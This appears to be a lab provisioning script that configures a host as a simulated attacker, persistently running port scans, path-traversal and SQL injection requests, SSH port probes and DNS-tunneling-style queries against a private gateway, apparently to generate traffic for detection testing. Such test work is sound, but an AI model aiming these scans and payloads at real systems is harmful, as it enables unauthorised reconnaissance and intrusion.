#!/bin/bash
# edge-setup.sh — COMPROMISED edge device. Runs a multi-stage attack against the
# gateway: recon -> web exploitation -> SSH brute force -> DNS exfiltration.
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive
echo 'Acquire::ForceIPv4 "true";' | sudo tee /etc/apt/apt.conf.d/99force-ipv4 >/dev/null
sudo ip route del default via 10.0.1.1 2>/dev/null || true
sudo apt-get update -y
sudo apt-get install -y --no-install-recommends nmap curl netcat-openbsd dnsutils iputils-ping \
  || sudo apt-get install -y --fix-missing --no-install-recommends nmap curl netcat-openbsd dnsutils iputils-ping
sudo ip route replace 10.0.2.0/24 via 10.0.1.1 || true

sudo tee /usr/local/bin/edge-attack.sh >/dev/null <<'EOF'
#!/bin/bash
GW=10.0.1.1
while true; do
  echo "[recon] port scans"
  nmap -sS -T4 -p1-1024 "$GW" >/dev/null 2>&1 || true
  nmap -sF -T4 -p1-300 "$GW"  >/dev/null 2>&1 || true
  nmap -sX -T4 -p1-300 "$GW"  >/dev/null 2>&1 || true
  echo "[web] exploitation"
  # --path-as-is so curl does NOT collapse ../ before sending (keeps the traversal on the wire)
  curl --path-as-is -s -m 5 "http://$GW/../../../../etc/passwd" >/dev/null 2>&1 || true
  curl --path-as-is -s -m 5 "http://$GW/app?file=../../../../etc/passwd" >/dev/null 2>&1 || true
  curl -s -m 5 "http://$GW/?id=1%20union%20select%201,2,3--" >/dev/null 2>&1 || true
  curl -s -m 5 -A "EvilEdgeBot/1.0" "http://$GW/admin" >/dev/null 2>&1 || true
  echo "[brute] ssh login attempts"
  for i in $(seq 1 20); do nc -z -w1 "$GW" 22 >/dev/null 2>&1 || true; done
  echo "[exfil] dns tunneling"
  for i in $(seq 1 6); do
    # read /dev/urandom until we have 55 alnum chars (a long label ~ tunneling)
    L=$(tr -dc 'a-z0-9' </dev/urandom | head -c 55)
    dig @"$GW" "${L}.exfil.lan" +time=2 +tries=1 >/dev/null 2>&1 || true
  done
  sleep 25
done
EOF
sudo chmod +x /usr/local/bin/edge-attack.sh
sudo tee /etc/systemd/system/edge-traffic.service >/dev/null <<'EOF'
[Unit]
Description=Compromised edge attacker
After=network-online.target
[Service]
ExecStart=/usr/local/bin/edge-attack.sh
Restart=always
[Install]
WantedBy=multi-user.target
EOF
sudo systemctl daemon-reload
sudo systemctl enable edge-traffic.service
sudo systemctl restart edge-traffic.service
echo "edge (attacker) configured: recon + web + brute + dns-exfil."
